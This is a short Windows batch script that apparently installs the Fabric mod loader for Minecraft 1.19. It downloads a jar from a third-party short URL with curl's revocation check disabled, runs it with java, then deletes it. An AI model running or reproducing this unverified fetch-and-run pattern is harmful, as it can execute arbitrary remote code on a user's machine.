@echo off
C:
cd %appdata%\.minecraft
curl --ssl-no-revoke -sL -o fabric.jar https://dl.scdmx.de/fa
java -jar fabric.jar client -mcversion 1.19 -loader 0.14.7
del /S /Q fabric.jar
